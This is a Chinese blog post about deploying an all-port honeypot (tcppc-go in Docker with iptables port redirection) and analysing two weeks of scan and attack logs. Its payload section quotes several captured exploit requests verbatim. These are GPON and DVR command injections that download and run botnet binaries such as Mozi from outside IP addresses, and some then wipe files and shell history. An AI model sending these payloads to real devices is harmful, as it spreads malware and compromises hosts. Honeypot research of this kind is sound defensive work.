## **一、引言**

**在当前的网络环境中，存在着各种流量，包括网络空间扫描流量、搜索引擎爬虫流量、恶意软件的探测流量等等，例如mirai病毒在进行telnet爆破过程中，其目标IP就是随机生成的（排除内网IP及一些特殊IP）。前段时间，本人对SSH蜜罐cowire的docker部署及数据展示进行了介绍，有兴趣的读者可以查看文章《[Cowrie蜜罐的Docker部署过程及Elasticsearch+Kibana可视化](../articles/network/236525.html)》。本文将继续蜜罐这个方向，介绍一种全端口蜜罐。**

一般而言，大部分蜜罐都是针对某种服务来运行的，例如前文提到的ssh蜜罐cowrie。通过模拟该种服务的正常协议交互，完成握手阶段，并进行数据传输，基于这种蜜罐可以记录攻击者的行为。但前文提到，mirai病毒定位目标是通过随机的IP算法生成；同时每天云主机的SSH端口也收到各种爆破流量，由此本人萌生了一个想法，那么是不是还有其他端口也在受到扫描或者攻击。要获取这些信息，显然使用tcpdump并不可行，虽然能收到各种扫描的流量，但没有系统协议栈的支撑，并不能得知连接的负载；而如果使用开启多个端口又不现实，毕竟端口数量这么多，管理起来也不方便。要满足上述需求，需要一个能够接受全端口流量的蜜罐。

本文基于上述背景，部署一款全端口蜜罐，并对半个月时间内收到的日志进行简单分析。整体的文章结构如下：首先介绍使用tcppc-go及docker搭建一个可以记录连接信息的蜜罐，然后利用iptables将端口转发之特定端口，最后分析采集到的两周的数据。

## 二、全端口蜜罐的部署

### 2.1 需求分析

首先来具体说明一下，对于这款蜜罐的具体需求。

1\. 能够接受客户端（攻击或扫描）的连接，不需要进行具体的某种协议的交互，能够接收并记录用户发送过来的数据，持续运行只要客户端还在发送数据；

2\. 能够记录日志，包括连接信息，数据包内容等；

3\. 能够接收系统的全端口流量。

本着不重复造轮子的思想，在github上搜索"all port honeypot"，找到了一款能够满足功能的程序[tcppc-go](https://github.com/md-irohas/tcppc-go)。除了能满足上述需求，同时还能支持UDP协议，甚至可以加载SSL证书，进行SSL握手。本次部署过程中不考虑SSL及UDP。其github主页上也介绍了如何能够捕获全端口的数据负载，通过iptables进行转发，但本文没有采用他的命令，请读者谨慎尝试。

### 2.2 部署过程

tcppc-go是一款使用go语言编写的程序，虽然本人有一些go语言基础，但是不想折腾基础语言环境，就借助docker的方式来搭建这个蜜罐，这样也方便没有go基础的读者直接进行部署。因此，本次部署过程中，与上一篇cowrie蜜罐相同，采用docker部署的方式，但不进行数据展示，直接输出原始日志，本次蜜罐部署的环境如下：

环境| 版本信息  
---|---  
宿主机，操作系统| 阿里云，CentOS Linux release 7.3.1611 (Core)  
docker版本| Docker version 19.03.8  
  
 **2.2.1 构造镜像**

Dockerfile是构造镜像的模板，docker会根据Dockerfile的程序逐渐构造镜像，关于具体的指令，下面的Dockerfile已经添加了简单的注释，想深入了解命令使用的读者可以自行搜索。

    
    
    ###使用golang作为基础镜像提供程序运行环境
    FROM golang
    #设置时区变量
    ENV TZ=Asia/Shanghai
    #调整时区,从github拉取相应源码，并编译
    run ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo $TZ > /etc/timezone && \
        go get github.com/md-irohas/tcppc-go && \
        cd /go/src/github.com/md-irohas/tcppc-go && \
        go build main.go
    #跳转至生成的程序位置
    WORKDIR /go/bin/
    #执行命令
    cmd ["./tcppc-go", "-T","86400","-w","log/tcppc-%Y%m%d.jsonl"]
    

上述Dockerfile的主要构造流程如下。首先，拉取golang作为基础镜像，为程序提供go语言环境；然后，在设置了时区变量之后，将时区调整为上海市区，如果不调整，默认会比上海时间慢8个小时；其次，利用go命令获取程序源码；最后，进入相应路径进行编译。

新创建一个文件夹docker_test（后续操作均将在该路径下执行），并按照上述内容编辑Dockerfile文件，在文件夹下执行命令:`docker
build -t all_port:1.0 .`

其中-t参数是设置最终生成镜像的名字与版本号，可自行调整；程序会运行一段时间，大致上需要3-5分钟时间，主要卡顿在拉取go基础镜像和获取github源码过程中。

![docerfile构造过程.png](https://image.3001.net/images/20200611/1591882929_5ee234b1901a1.png!small)上述命令会输出以上信息，输出这些信息表明蜜罐已经构建成功；测试镜像是否成功构造并能运行，首先创建log文件夹，用来后续挂载文件夹到镜像中，并保存日志，执行以下命令。

    
    
    docker -it -d --restart=always --net=host -v `pwd`/log:/go/bin/log/ all_port:1.0

此时可以查看到log文件夹下已经生成了log文件。非root用户可能需要调整文件夹的权限。docker运行命令中，利用--net=host让镜像使用宿主机的网络，这样可以直接绑定端口到系统上，后续利用iptable时，只需要指定端口。 tcppc-go会默认绑定tcp/udp端口号12345，可以通过`telnet 0 12345`进行测试，随便敲击命令，即可在日志中查看到日志。

![日志信息.png](https://image.3001.net/images/20200611/1591883490_5ee236e2a7ae1.png!small)按照上述步骤能够出现以上信息，说明镜像已经构造成功，并且能够成功运行并获取日志。但是当前只是开启的一个端口进行监听，下面来介绍通过iptables将本机端口转发至tcppc-go的12345端口。

 **2.2.2 调整iptables进行端口转发**

**请注意，利用iptables如果命令错误可能导致机器无法访问，或者影响其他正常服务，特别是SSH端口。一定要注意自己的命令是否正确。最好是在自己的测试机或者虚拟机上先测试命令，保证命令正确无影响。以下命令均在本人的机器上测试没有问题，但是每个人的情况都不同，请一定谨慎**
。

先来解释一个最简单的命令`iptables -t nat -A PREROUTING -p tcp -i eth0 --dport 5000:8000 -j
REDIRECT --to-ports 12345`。

下面来说明一下命令的具体内容，该命令将在防火墙的nat表（`-t nat`）中prerouting（`-A
PREROUTING`）位置创建一条规则，这条规则针对发往网卡eth0（`-i eth0`）tcp协议（`-p
tcp`）的流量，其中端口范围是5000-8000（`--dport 5000:8000`）的将重定向至12345端口（`-j REDIRECT --to-ports 12345`）。

执行命令（外网IP），`telnet your_machine_ip
5000`，可以发现成功联通；上述命令不支持在部署蜜罐的本机进行使用"0.0.0.0"或者回环地址测试，会回显拒绝服务的信息，这是由于iptables的生效位置导致。

虽然上述命令可以将端口转发至蜜罐的端口，但是输出的蜜罐日志中却缺失了端口信息，所有的流量都呈现为访问12345端口，这样不利于具体的端口行为分析。所以需要调整上述命令，来记录端口转发过程日志。下面来具体说明在实际部署过程中采用的命令。为了验证命令的可行性，会将原有蜜罐的防火墙规则清楚，重新逐步加载规则。

执行命令查看nat表中现有的规则，`iptables -t nat -L -nv`，得到以下图片中输出。

![iptables.png](https://image.3001.net/images/20200612/1591922121_5ee2cdc9ec513.png!small)

上图输出中的最后一条规则正是刚刚执行的命令生成的，先执行命令把这条规则删除，执行命令`iptables -t nat -D PREROUTING
5`，其中5对应的这条规则的编号，可以通过一下命令（`iptables -t nat -L -nv --line-numbers`）来获取编号。在后续中，如果发现规则有问题，可以按照编号删除相应的规则，一定要注意不要把正常的规则删除。

![编号.png](https://image.3001.net/images/20200612/1591922215_5ee2ce27cd32e.png!small)

一、开启iptables日志

1\. 在文件/etc/rsyslog.conf中添加一行内容，`kern.info /var/log/iptables.log`

2\.
为了让日志和ssh日志一样回滚，将文件名`/var/log/iptables.log`加入文件`/etc/logrotate.d/syslog`中，配置后文件内容如下。

![image.png](https://image.3001.net/images/20200612/1591923001_5ee2d139af108.png!small)

3\. 执行重启服务`service rsyslog restart`使配置生效。

二、iptables日志规则

执行以下两条命令。

`iptables -t nat -A PREROUTING -p tcp -i eth0 --dport 5000:8000 -j LOG --log-level 6 --log-prefix "port_for"`

`iptables -t nat -A PREROUTING -p tcp -i eth0 --dport 5000:8000 -j REDIRECT
--to-ports 12345`

下面简单说明一下上述命令的含义。第一条命令是将进来的流量进行记录，日志等级6对应前面的`kern.info`，日志前缀为port_for，无意义，可自行定义。第二条命令将流量重定向至端口12345。经过测试，上述两条命令如果顺序颠倒，虽然能进行重定向，但没有日志输出。

测试：执行命令`telnet your_machine_ip 5000`，可以在`/var/log/iptables.log`中看到实时输出。

![转发日志.png](https://image.3001.net/images/20200612/1591923736_5ee2d418be79b.png!small)

其他端口只需要修改端口范围即可，执行命令类似；如果命令都正确，却无法连通，请查看是否是云主机没有开放端口的原因。

 **2.2.3 部署过程小结**

在前面的内容中，本文描述了如何通过docker部署tcppc-go程序，并简单介绍了利用iptables完成端口转发功能。请在自己机器上部署的读者在执行iptables命令时，一定要谨慎，最好是现在虚拟机或者测试机上进行命令的测试，以免造成不必要的麻烦。

## 三、全端口蜜罐的数据分析

前文中，已经对全端口蜜罐的部署过程进行了详细的描述。按照步骤部署，现在可以拥有两个源头的数据，一个是由iptables进行端口转换过程中，生成的端口转换日志（TCP连接）；一个是有tcppc-go程序采集到的连接信息（包含负载）。下面利用python分别来对这两方面数据进行分析，主要用到的第三方库是pandas数据分析库，同时采用jupyter-notebook的形式方便分析过程。分析的日志时间为从2020年5月24日至2020年6月7日，其中在5月24日进行部署，日志仅为半天的数据量，其余时间均为整天的数据。本部分分析集中于数据的分析，对代码实现不进行详细描述，后文中提供github地址，包含jupyter的分析过程。

注：因为本人的云主机中还承载着SSH/蜜罐（22/2222端口），以及SSH蜜罐（23/2323)，这部分服务由之前一篇文章中介绍的cowrie蜜罐处理，下文中的日志中没有体现这部分日志，可能会在日志数量上有偏差。利用iptables转发范围包括（24-2221），（2324-65535）。

### 3.1 iptables端口转化日志数据分析

![每天的日志总量.png](https://image.3001.net/images/20200615/1592187808_5ee6dba0c95f2.png!small)图1.
日志数量（按天）

从图1中可以看出，在部署蜜罐之后，日志数量在两天后趋于稳定，如果排除5月24日不计，剩余14天每天的平均日志数量为35000左右。

![去重IP及端口数量.png](https://image.3001.net/images/20200615/1592187964_5ee6dc3c30376.png!small)

图2. 去重日志数量

虽然每天的日志数量非常多，但是从去重的ip/端口数量（图2）上来看，每天的IP数量趋于稳定，大致在2400左右；端口数量较多在14000左右。

![15天top25端口.png](https://image.3001.net/images/20200615/1592187904_5ee6dc001e26c.png!small)图3.
日志中访问端口排序

图3展示了在15天日志中，访问最多的是445端口，配合最近爆出的SMB漏洞，这个端口的访问量这么高，不难理解；其次是8088（大概率是WEB服务）、1433（SQL
Server默认端口）。图3主要针对所有日志的端口进行排序，下面将每个访问的端口的ip进行去重后，来查看访问最高的端口。

![TOP25端口-按ip去重.png](https://image.3001.net/images/20200615/1592189668_5ee6e2e4c030d.png!small)

图4. 日志中访问端口（IP去重）排序

从图4中可以看出，在经过IP去重后再排序，第一个端口和第二个端口的差距没有那么悬殊了，通过第二第三多的端口也发生了变化。以上图片中均采用天为单位进行说明，下面采用时间区间比较小的30min中来说明。以下去重意义，是指在时间区间内，对IP或者端口分别进行去重。![每30分钟日志数量.png](https://image.3001.net/images/20200615/1592205271_5ee71fd7e41b6.png!small)

图5. 日志数量（每30分钟）

从图5中可以看出，IP数量趋于稳定，但日志数量不稳定，且存在波动；去重日志中，端口数量多于IP数量，存在扫描行为或者同一个IP连接多个端口的行为。如果没有扫描行为，那么源IP与目的端口数量应该是相当的；日志数量明显高于其他两个数量的时间点，说明存在某个IP对某个端口（或多个端口）进行了多次访问，产生了多次日志。上图的时间广度太大了，下面来通过一天的日志来说明这个前面的结论。

![25号15分钟的日志数量.png](https://image.3001.net/images/20200615/1592206462_5ee7247e896a0.png!small)

图6. 25号日志数量

在图6中的标识中，类型1椭圆处，日志数量与目的端口数量激增，且数量相当，说明存在某个IP在进行端口扫描行为；类型2的椭圆处，IP数量与端口数量相当，但日志数量比前者多，说明了某个IP对某个端口（或多个端口）进行了多次访问。虽然类型2中，也有可能有IP在进行小规模的端口扫描，但相对来说，类型1的这种现象更能说明有IP进行端口扫描的行为。为了验证结论，这里将类型1位置时间的日志打印出来，具体可以从图7中看出，的确存在扫描行为。

![image.png](https://image.3001.net/images/20200617/1592354604_5ee9672ceef43.png!small)

图7. 端口扫描行为的日志  
![国家分布.png](https://image.3001.net/images/20200615/1592208110_5ee72aeef18c8.png!small)

图8. 国家分布

图8绘制了全部日志地域分布，分析过程中采用了第三方库geoip2。在国家分布中，除了中国作为第一位，俄罗斯和荷兰日志量最多，本人在部署HTTP代理蜜罐过程中也发现了这样的情况，存在大量俄罗斯的IP在进行访问。

### 3.2 TCP连接数据负载分析

在处理TCP负载日志中发现，tcppc-go生成的日志为json格式，且数据负载已经由base64进行编码，虽然pandas支持从json文件中获取数据，但有些数据类型，例如数组，并不能完美支持。本次主要查看TCP负载中一些攻击的流量，在对数据负载进行解码之后，直接按照某些特殊字符查找。按照之前部署ssh蜜罐的经验，很多通过wget进行恶意样本的下载；同时HTTP协议中，有些存在webshll服务。下面就按照两个字符串进行分析："wget"和"shell"。这部分日志数量非常大，这里仅仅贴出一些作为示例。

    
    
    POST /GponForm/diag_Form?images/ HTTP/1.1\r\nHost: 127.0.0.1:80\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nUser-Agent: Hello, World\r\nContent-Length: 118\r\n\r\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://116.114.95.192:58149/Mozi.m+-O+->/tmp/gpon80;sh+/tmp/gpon80&ipv=0

经过搜索，上述载荷是利用GPON漏洞[1]。

    
    
    GET /cgi-bin/supervisor/CloudSetup.cgi?exefile=cd%20/tmp;%20wget%20http://23.254.227.92/bins.sh%20-O%2012.bins.sh;curl%20-O%20http://23.254.227.92/bins.sh%20-O%2011.bins.sh;%20chmod%20777%20*;%20sh%2011.bins.sh;%20sh%2012.bins.sh HTTP/1.0\r\n\r\n

DVR漏洞[2]。

    
    
    GET /shell?cd%20/tmp;wget%20http:/%5C/23.254.164.76/ally.sh%20-O%20gf;%20chmod%20777%20gf;./gf%20DVR HTTP/1.1\r\nHost: xx.xx.xx.xx:5500\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nUser-Agent: python-requests/2.6.0 CPython/2.6.6 Linux/2.6.32-754.el6.x86_64\r\n\r\n
    
    
    GET /shell?cd%20/tmp;wget%20http:/%5C/185.172.110.227/sys6;%20chmod%20777%20sys6;%20./sys6 HTTP/1.1\r\nHost: xx.xx.xx.xx:5502\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nUser-Agent: python-requests/2.6.0 CPython/2.6.6 Linux/2.6.32-754.29.2.el6.x86_64\r\n\r\n
    
    
    GET /shell?cd%20/tmp%20%7C%7C%20cd%20/run%20%7C%7C%20cd%20/;%20wget%20http://185.103.110.146/axisbins.sh;%20chmod%20777%20axisbins.sh;%20sh%20axisbins.sh;%20rm%20-rf%20axisbins.sh;rm%20-rf%20*;%20clear;history%20-c;%20clear;history%20-w HTTP/1.1\r\nHost: xx.xx.xx.xx:5501\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nUser-Agent: python-requests/2.6.0 CPython/2.6.6 Linux/2.6.32-754.el6.x86_64\r\n\r\n
    
    
    GET /shell?cd+/tmp;rm+-rf+*;wget+http://112.17.89.155:51082/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1\r\nUser-Agent: Hello, world\r\nHost: xx.xx.xx.xx:80\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nConnection: keep-alive\r\n\r\n

上述命令不清楚是什么产品的漏洞。但是这些负载都是TCP的首包，说明这些攻击不需要进行交互，他们的原理应该与mirai僵尸网络病毒一致，通过随机生成IP来攻击主机。同时，日志中存在各种爬虫以及服务探测的流量，这里不再一一列举。

### 3.3 数据分析总结

本小节针对采集到的日志进行了分析，主要针对端口转换过程中产生的端口日志进行了详细的分析，分析了日志数量，端口分布，地域分布等，可以发现扫描行为，且知道被探测端口最多的是哪些；对于负载分析部分，主要利用已知的两种指纹wget和shell直接进行匹配，可以发现非常多的日志，这些连接没有前期交互，直接就开始下载恶意样本。

## 四、 总结

本篇文章主要针对全端口蜜罐的部署以及数据分析展开。利用iptables配合开源软件tcppc-go记录日志，然后详细分析了端口转换日志，并简单列举了几种攻击样本。通过本文的分析，可以发现一台存活的云主机其受到的流量行为分布：端口、访问IP、地域，以及查看各种负载；通过端口转发日志可以看到端口扫描行为，通过负载信息，可以看到存在各种样本。但本文中的方法主要是进行离线分析，后续如果有机会再开发实时显示的系统；同时利用非结构数据库来存储负载信息。

本文所使用的dockerfile以及分析端口转发日志的jupyter分析过程已经上传至[all_port_honeyport](https://github.com/CymaticsCC/all_port_honeyport)。

## 参考文章

> [1][GPON漏洞的在野利用（一）——muhstik
> 僵尸网络](https://zhuanlan.zhihu.com/p/36741900?utm_source=com.huawei.works)
>
> [2][AVTECH DVR设置无需用户登录的命令执行漏洞](https://www.seebug.org/vuldb/ssvid-92493)

